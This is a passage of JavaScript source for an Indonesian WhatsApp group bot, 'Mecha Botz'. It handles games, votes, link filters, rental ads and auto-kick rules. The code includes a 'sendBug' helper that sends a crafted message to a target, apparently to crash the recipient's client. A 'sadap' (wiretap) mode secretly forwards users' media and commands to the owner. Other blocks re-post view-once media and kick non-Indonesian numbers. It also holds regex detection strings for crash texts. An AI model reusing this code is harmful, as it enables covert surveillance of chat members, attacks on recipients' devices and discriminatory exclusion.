const isfam = (chatId, _db) => {
    let status = false
    Object.keys(_db).forEach((i) => {
        if (_db[i].id === chatId) {
            status = true
        }
    })
    return status
}
const cekWaktuFam = (surya, _dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            var juwu = `𝗚𝗔𝗠𝗘 𝗙𝗔𝗠𝗜𝗟𝗬 *100*\n\n*Waktu habis*\n*Jawaban yang belum terjawab :*\n\n`
            let aae = _dir[position].jawaban
            for (let i of aae){
                juwu += `${i}\n`
            }
//surya.sendMessage(_dir[position].id, juwu, MessageType.text)
const buttons = [{buttonId: 'family100', buttonText: {displayText: 'Lanjut ➡️'}, type: 1}]
const buttonsMessage = {
contentText: juwu,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(_dir[position].id, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, '0@s.whatsapp.net']}, msg})            
            _dir.splice(position, 1)
        }
    }, 1000)
}
const getfamposi = (chatId, _dir) => {
    let position = null
    Object.keys(_dir).forEach((i) => {
        if (_dir[i].id === chatId) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

if(isGroup && !isVote) {
        if (budy.toLowerCase() === 'vote'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '✅'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = `*Vote* @${_votes[0].votes.split('@')[0]} \n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'devote'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '❌'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Devote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}	

let idttt = []
let ers1 = []
let ers2 = []
let gilir = []
for (let t of ky_ttt){
idttt.push(t.id)
ers1.push(t.er1)
ers2.push(t.er2)
gilir.push(t.gilir)
}
const isTTT = isGroup ? idttt.includes(from) : false
let iser1 = isGroup ? ers1.includes(sender) : false
let iser2 = isGroup ? ers2.includes(sender) : false
try {
var pporang = await surya.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
var pporang = 'https://i.ibb.co/t2m9fFt/88876ba5bb74.jpg'
}
const freply = await getBuffer(pporang)
const sekarang = new Date().getTime();

const selectedButton = (type == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
const responseButton = (type == 'listResponseMessage') ? msg.message.listResponseMessage.title : ''

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
}
surya.sendMessage(id,buttonMessage,MessageType.buttonsMessage,options)
}

///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
let kma = gam1
let mhan = await surya.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
surya.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
let kma = vid1
let mhan = await surya.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
surya.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
let mhan = await surya.prepareMessage(from, suryaImg, location, {thumbnail:suryaImg})
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
surya.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

const sendBug = async (target) => {
 await surya.relayWAMessage(
 surya.prepareMessageFromContent(
target,
surya.prepareDisappearingMessageSettingContent(0),
{}
 ),{ waitForAck: true }) 
}

const daftar1 = `@${sender.split("@")[0]}, ${mess.OnlyVerify}`
const daftar2 = `ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴠᴇʀɪғʏ\n© ɪ ᴀᴍ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ᴄʀᴇᴀᴛᴇᴅ ʙʏ @${Suryaa.split("@")[0]}`
const daftar3 = [{buttonId: `210505`, buttonText: {displayText: '⬡ 𝗩𝗘𝗥𝗜𝗙𝗬 '}, type: 1}]

const prem1 = `@${sender.split("@")[0]}, ${mess.OnlyPrem}`
const prem2 = `ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴇʟɪ ᴘʀᴇᴍɪᴜᴍ\n© ɪ ᴀᴍ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ᴄʀᴇᴀᴛᴇᴅ ʙʏ @${Suryaa.split("@")[0]}`
const prem3 = [{buttonId: `buypremium`,buttonText: {displayText: `⬡ 𝗕𝗨𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 `}, type: 1}]

if (messagesC.match('https://chat.whatsapp.com/')){
if (!isGroup) return
if (!isAntiLinkGrup) return
if (isGroupAdmins) return 
if (messagesC.includes('#izinadmin')) return reply('#izinadmin diterima')
let button0 = [{buttonId: `verify`, buttonText: {displayText: 'Mampus ^_^'}, type: 1}]
let buttons0 = {
    contentText: `*「 GROUP LINK TERDETEKSI 」*\n\nSepertinya @${sender.split('@')[0]} mengirimkan link grup, maaf kamu akan saya kick`,
    footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
    buttons: button0,
    headerType: 1
}
await surya.sendMessage(from, buttons0, MessageType.buttonsMessage, {quoted: msg, contextInfo: { mentionedJid: [sender, Suryaa]}})
//setTimeout(() => {
surya.groupRemove(from, [sender]) //.catch((e)=>{reply(`*ERR:* ${e}`)})
//},3000)
}

//AntiTagSurya By Surya
if (isGroup && !isBan && isAntiTagSurya && !isOwner && !isPremium && isBotGroupAdmins){
if (chats.match(/(@62895415497664)/gi)) {
reply(`*「 TAG SURYA TERDETEKSI 」*\n\n*SEPERTINYA KAMU TELAH MENGETAG SURYA*\nMaaf Kamu Akan Saya Kick!\n\nMᴀᴋᴀɴʏᴀ Lᴀɪɴ Kᴀʟɪ Jᴀɴɢᴀɴ Tᴀɢ Tᴀɢ Oᴡɴᴇʀ Sᴜʀʏᴀ😾`)
surya.groupRemove(from, [sender])
}
}

if (isGroup && !isBan && !isOwner && !isOwner2 && isAntiTag){
if (chats.match(/(@62)/gi)) {
surya.sendMessage(from, Tag, sticker, {quoted: { key: { fromMe: false, participant: '0@s.whatsapp.net', ...(from ? { remoteJid: from } : {}) }, message: { conversation: `*${sholat} ${pushname}*
*${runtime(process.uptime())}*` }}})
}
}

if (autovn) {
if (autovn === false) return
await surya.updatePresence(from, Presence.recording)
}
if (autoketik) {
if (autoketik === false) return
await surya.updatePresence(from, Presence.composing)
}
if (autoread) {
if (autoread === false) return
await surya.chatRead(from, "read")
}
if (isGroup && fromMe) {
let getmemex = groupMembers.length
if (getmemex <= memberLimit) {
reply(`Maaf Mecha Botz tidak bisa masuk grup karna member grup *${groupMetadata.subject}* tidak memenuhi limit member\n\nMinimal member *${memberLimit}*`)
await sleep(5000)
surya.groupLeave(from)
}
}

if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitroli === true) return
if (msg.key.fromMe) return
reply('*Troli detected!*\n\n' + require('util').format(m.key))
await surya.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}

if (isGroup && antihidetag === true && m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
 groupMembers.length
) {
 console.log(
 color("[ANTI-HIDETAG]", "red"),
 color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
 );
 reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
 kick(from, sender);
}

//ANTI VIEW ONCE
if (isViewOnce) {
let typenya = msg.message.viewOnceMessage.message["videoMessage"] ? msg.message.viewOnceMessage.message.videoMessage : msg.message.viewOnceMessage.message.imageMessage
typenya["viewOnce"] = false
typenya["caption"] = `*Anti-ViewOnce*\n\n${typenya.caption}`
let peq = msg.message.viewOnceMessage.message["imageMessage"] ? { key: { fromMe: false, participant: sender, id: msg.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } } :{ key: { fromMe: false, participant: sender, id: msg.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } }
let pe = await surya.prepareMessageFromContent(from, msg.message.viewOnceMessage.message, {quoted: peq})
await surya.relayWAMessage(pe)
}

if (sadap === true && isViewOnce) {
let typenya = msg.message.viewOnceMessage.message["videoMessage"] ? msg.message.viewOnceMessage.message.videoMessage : msg.message.viewOnceMessage.message.imageMessage
typenya["viewOnce"] = false
typenya["caption"] = `ViewOnce\n\n${typenya.caption} *from* @${sender.split('@')[0]} ${groupName}`
let peq = msg.message.viewOnceMessage.message["imageMessage"] ? { key: { fromMe: false, participant: sender, id: msg.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true }}}}} :{key: {fromMe: false, participant: sender, id: msg.key.id}, message: {"viewOnceMessage": {"message": {"imageMessage" : {"viewOnce": true}}}}}
let pe = await surya.prepareMessageFromContent(Suryaa, msg.message.viewOnceMessage.message, {contextInfo: {mentionedJid: [sender]}, peq})
await surya.relayWAMessage(pe)
/*setTimeout(() => {
surya.deleteMessage(Suryaa, pe.key)
},5000)*/
}
if (sadap === true && isImage && !fromMe) {
let media = await surya.downloadAndSaveMediaMessage(msg)
let bot = await surya.sendMessage(Surya, fs.readFileSync(media), image, {contextInfo: {forwardingScore: 100, isForwarded: true, mentionedJid: [sender]}, msg, caption: `${command} ${q} *from* @${sender.split('@')[0]} ${groupName}`})
/*setTimeout(() => {
surya.deleteMessage(Suryaa, bot.key)
},5000)*/
}
if (sadap === true && isVideo && !fromMe) {
let media = await surya.downloadAndSaveMediaMessage(msg)
let bot = await surya.sendMessage(Surya, fs.readFileSync(media), video, {contextInfo: {forwardingScore: 100, isForwarded: true, mentionedJid: [sender]}, msg, caption: `${command} ${q} *from* @${sender.split('@')[0]} ${groupName}`})
/*setTimeout(() => {
surya.deleteMessage(Suryaa, bot.key)
},5000)*/
}
if (sadap === true && isSticker && !fromMe) {
let media = await surya.downloadAndSaveMediaMessage(msg)
let bot = await surya.sendMessage(Surya, fs.readFileSync(media), sticker, {contextInfo: {forwardingScore: 100, isForwarded: true, mentionedJid: [sender]}, quoted: {key: {fromMe: false, participant: '0@s.whatsapp.net', ...(from ? {remoteJid: from} : {})}, message: {conversation: `_*Pesan sticker dari*_ ${pushname} _*di*_ ${groupName}`}}})
/*setTimeout(() => {
surya.deleteMessage(Suryaa, bot.key)
},5000)*/
}
if (sadap === true && isAudio && !fromMe) {
let media = await surya.downloadAndSaveMediaMessage(msg)
let bot = await surya.sendMessage(Surya, fs.readFileSync(media), audio, {contextInfo: {forwardingScore: 100, isForwarded: true, mentionedJid: [sender]}, quoted: {key: {fromMe: false, participant: '0@s.whatsapp.net', ...(from ? {remoteJid: from} : {})}, message: {conversation: `_*Pesan audio dari*_ ${pushname} _*di*_ ${groupName}`}}})
/*setTimeout(() => {
surya.deleteMessage(Suryaa, bot.key)
},5000)*/
}
// CMD
if (isCmd && !isSticker && !isVideo && !isAudio && !isList && !isButton && !isViewOnce) {
addBalance(sender, randomNomor(100), balance)
console.log(color('[CMD]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'cyan'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (sadap === true && isCmd && !isSticker && !isVideo && !isAudio && !isList && !isButton && !isViewOnce) {
let bot = await surya.sendMessage(Surya, `${budy} *from* @${sender.split('@')[0]} ${groupName}`, text, {thumbnail: suryaImg, sendEphemeral: true, msg, contextInfo : {mentionedJid: [Surya, sender], forwardingScore: 100, isForwarded: true}})
/*setTimeout(() => {
surya.deleteMessage(Suryaa, bot.key)
},5000)*/
}
if (isCmd && !fromMe && !isSticker && !isImage && !isVideo && !isAudio && !isList && !isButton && !isViewOnce) {
_totalharian.push(budy)
fs.writeFileSync('./database/totalharian.json', JSON.stringify(_totalharian))
}
if (isCmd && !isBan && !fromMe && !isOwner2) {
const autoresp = getRespon(chats.toLowerCase())
if (autoresp !== null && autoresp !== undefined) return textImg(autoresp)
}

if (fromMe) {
//if (isOwner) {
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (_vn.includes(chats.toLowerCase())) {
surya.sendMessage(from, fs.readFileSync(`./media/audio/${chats}.mp3`), audio, {quoted:msg, contextInfo :{text: 'hi',
"forwardingScore": 1000,
isForwarded: false,
sendEphemeral: true,
"externalAdReply": {
"title": `Hallo ${pushname}` ,
"body": `${Ucapan}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/x1MYdPq/89d0172ec11d.jpg",
"mediaUrl": "https://youtu.be/3jYbJq2JMiM",
"thumbnail": "https://i.ibb.co/x1MYdPq/89d0172ec11d.jpg",
"sourceUrl": "",
},mentionedJid:[Suryaa, sender]}})
gameAdd(sender, glimit)
}
}
if (isCmd && fromMe) {
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (!fromMe && !isOwner && !isOwner2) return
if (_stick.includes(chats.toLowerCase())) {
surya.sendMessage(from, fs.readFileSync(`./media/sticker/${chats}.webp`), sticker, {contextInfo: { forwardingScore: 10000, isForwarded: true, mentionedJid: [sender]}, quoted: msg})
gameAdd(sender, glimit)
}
}
if (isCmd && fromMe) {
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (!fromMe && !isOwner && !isOwner2) return
if (_image.includes(chats.toLowerCase())) {
surya.sendMessage(from, fs.readFileSync(`./media/image/${chats}.jpeg`), image, {contextInfo: { forwardingScore: 10000, isForwarded: true, mentionedJid: [sender]}, quoted: msg})
gameAdd(sender, glimit)
}
}

if (isGroup && !isBan && isAutoJoin) {
if (budy.includes("://chat.whatsapp.com/")) {
console.log(color("[AUTO-JOIN]", "cyan"),color("CREATED BY SURYA", "white"))
surya.query({json: ["action","invite",`${budy.replace("https://chat.whatsapp.com/", "")}`]})
}
}

//ANTI BULE
if (isGroup && isAntiBule && !isOwner && !fromMe && !isOwner2) {
if (!sender.includes(+628)) {
reply(`*「 BULE TERDETEKSI 」*\n\nSepertinya kamu bukan orang Indonesia, maaf kamu akan di kick`)
surya.groupRemove(from, [sender]);
}
}

if (isGroup && !isOwner && !fromMe && !isOwner2) {
if (sender.includes(6288233502256)) {
textImg(`*「 BEBAN TERDETEKSI 」*\n\nMaafkamu akan saya kick karena kamu beban grup`)
surya.groupRemove(from, [sender]);
}
}

//Anti Link By Surya
if (isGroup && !isBan && isAntiLink && !isPremium && !isOwner && !isGroupAdmins){
if (chats.match(/(https:\/\/)/gi)) {
textImg(`*「 LINK TERDETEKSI 」*

Sepertinya kamu mengirimkan Link, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && !isBan && isAntiLink && !isOwner && !isPremium && !isGroupAdmins){
if (chats.match(/(http:\/\/)/gi)) {
textImg(`*「 LINK TERDETEKSI 」*\n\nSepertinya kamu mengirimkan Link, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}

if (isGroup && !isBan && isAntiLinkInstagram && !isOwner && !isPremium && !isGroupAdmins){
if (chats.match(/(instagram.com)/gi)) {
textImg(`*「 INSTAGRAM LINK TERDETEKSI 」*\n\nSepertinya kamu mengirimkan Link Instagram, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && !isOwner && !isOwner2 && !isPremium && !isGroupAdmins){
if (chats.match(/(Rokok Surya)/gi)) {
textImg(`_Maaf kamu akan saya kick karena telah mengejek creator saya_`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && !isOwner && !isOwner2 && !isPremium && !isGroupAdmins){
if (chats.match(/(Surya Pro)/gi)) {
textImg(`_Maaf kamu akan saya kick karena telah mengejek creator saya_`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && !isBan && isAntiLinkTiktok && !isOwner && !isPremium && !isGroupAdmins){
if (chats.match(/(tiktok.com)/gi)) {
textImg(`*「 TIKTOK LINK TERDETEKSI 」*\n\nSepertinya kamu mengirimkan Link TikTok, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && !isBan && isAntiLinkYoutube && !isOwner && !isPremium && !isGroupAdmins){
if (chats.match(/(youtube.com)/gi)) {
textImg(`*「 YOUTUBE LINK TERDETEKSI 」*\n\nSepertinya kamu mengirimkan Link YouTube, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && !isBan && isAntiLinkFacebook && !isOwner && !isPremium && !isGroupAdmins){
if (chats.match(/(facebook.com)/gi)) {
textImg(`*「 FACEBOOK LINK TERDETEKSI 」*\n\nSepertinya kamu mengirimkan Link Facebook, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && !isBan && isAntiLinktelegram && !isOwner && !isPremium && !isGroupAdmins && isBotGroupAdmins){
if (chats.match(/(https:\/\/t.me)/gi)) {
textImg(`*「 TELEGRAM LINK TERDETEKSI 」*\n\nSepertinya kamu mengirimkan Link Telegram, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiWame && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (chats.match(/(wa.me\/)/gi)) {
textImg(`*「 NOMOR LINK TERDETEKSI 」*\n\nSepertinya kamu mengirimkan link nomor, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(๒๒๒๒๒๒๒๒)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(◢▜⃟▜⃟⃟⃟▜✰̚c҇߯͠ყ͈ɓεͥ̂ɾรͣρ̃αͫc͛ε✰◢▜⃟▜⃟⃟z)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(BY⃢DANNIEL🇲🇾̛̫̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣̣͉͔͉͔͉͛͛͛͛͛͛͛͛͛͛͛͛͛͛͛͛͛̊̊̊̊̊̊̊̊̊̊̌̔̄̔̑̔̄̔̄̑̈́͝VIRTEX͔)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/("๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋")/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(৭৭৭৭৭৭৭৭)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(A̶m̶b̶ᷟo̶ᷢr̶e̶x̶s̶)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(๘๘๘๘๘)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(ṧ!ℓṽḙԻℨ!ℵ❡✺ᖱ)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(꧁🇮🇲⃢♱Ð̴͕̞ͪͦ̅̎̀̚͞ﾑ̢̮͞҉̵̀乙̞͓̈́͌̾̏҉͟ｲ͙͆͛ͮ͛̔ͅ乇̞̝͕͎ͩ̋尺̜̖̭͇͑ͮ̀́͢͜ 🇮🇲⃢♱꧂)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (isGroup && isAntiVirtex && !isOwner && isBotGroupAdmins){
if (chats.match(/(๖ۣۜH๖ۣۜe๖ۣۜk๖ۣۜe๖ۣۜl๖ۣۜK๖ۣۜo๖ۣۜk๖ۣۜU๖ۣۜn๖ۣۜi๖ۣۜc๖ۣۜo๖ۣۜd๖ۣۜe๖ۣۜB๖ۣۜy๖ۣۜF๖ۣۜr๖ۣۜe๖ۣۜ)/gi)) {
textImg(`*「 VIRTEX TERDETEKSI 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
surya.groupRemove(from, [sender])
}
}
if (!isMuted && !isOwner && !fromMe){
if (chats.match(/(Izin keluar)/gi)) {
textImg(`Permintaan diterima`)
setTimeout(() => {
surya.groupRemove(from, [sender])
},2000)
}
}
if (!isMuted && !isOwner && !fromMe){
if (chats.match(/(Izin out)/gi)) {
textImg(`Permintaan diterima`)
setTimeout(() => {
surya.groupRemove(from, [sender])
},2000)
}
}
if (!isMuted && !isOwner && !fromMe){
if (chats.match(/(Izin left)/gi)) {
textImg(`Permintaan diterima`)
setTimeout(() => {
surya.groupRemove(from, [sender])
},2000)
}
}
if (!isMuted && !fromMe){
if (chats.match(/(Assalam)/gi)) {
surya.sendMessage(from, `Waalaikumsalam @${sender.split('@')[0]}`, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {mentionedJid: [sender], forwardingScore: 100, isForwarded: true}})
}
}

if (!fromMe){
if (chats.match(/(Undangan untuk bergabung ke grup WhatsApp saya)/gi)) {
reply(`${Ucapan} @${sender.split('@')[0]} Kamu dapat menyewa mecha botz agar bisa masuk kedalam grup kamu

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *SEWA BOT* ❭
│• 1 Hari : 1K
│• 1 Minggu : 7K
│• 1 Bulan : 30K
│
│> *JADI USER PREMIUM*
│ 10K/Bulan
│
│> *JADI OWNER*
│ 30K/Bulan
│
│> *VIA PEMBAYARAN*
│ PULSA
│ DANA
│
│> *KELEBIHAN SEWA BOT*
│• Untuk mengatur grup
│• Banyak fitur keamanan untuk grup
│• Untuk menyambut member baru
│• Banyak fitur keren
│• Murah dan aman
│• Bot fast respon
│• Bot always online tergantung sinyal
│• Bot dapat kick member yang melanggar secara otomatis
│• Bot dapat berkomunikasi
│• Banyak fitur game
│• Dan lain lain
│ 
│> *Hubungi*
│ wa.me/62895415497664
└─────────────────`, {contextInfo: {"mentionedJid": [sender]}})
}
}

if (!isGroup && !fromMe){
if (chats.match(/(https:\/\/chat.whatsapp.com)/gi)) {
reply(`${Ucapan} @${sender.split('@')[0]} Kamu dapat menyewa mecha botz agar bisa masuk kedalam grup kamu

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *SEWA BOT* ❭
│• 1 Hari : 1K
│• 1 Minggu : 7K
│• 1 Bulan : 30K
│
│> *JADI USER PREMIUM*
│ 10K/Bulan
│
│> *JADI OWNER*
│ 30K/Bulan
│
│> *VIA PEMBAYARAN*
│ PULSA
│ DANA
│
│> *KELEBIHAN SEWA BOT*
│• Untuk mengatur grup
│• Banyak fitur keamanan untuk grup
│• Untuk menyambut member baru
│• Banyak fitur keren
│• Murah dan aman
│• Bot fast respon
│• Bot always online tergantung sinyal
│• Bot dapat kick member yang melanggar secara otomatis
│• Bot dapat berkomunikasi
│• Banyak fitur game
│• Dan lain lain
│ 
│> *Hubungi*
│ wa.me/62895415497664
└─────────────────`, {contextInfo: {"mentionedJid": [sender]}})
}
}
 
//MODE
if (mode === 'SELF'){
if (!fromMe && !isOwner && !isPremium) return
}
// Banned
if (isBan) return
BannedExpired(ban)

const levelRole = level.getLevelingLevel(sender, _level)
if (levelRole <= 1) {
var rank = 'Warrior V'
} else if (levelRole <= 4) {
rank = 'Warrior IV'
} else if (levelRole <= 7) {
rank = 'Warrior III'
} else if (levelRole <= 10) {
rank = 'Warrior II'
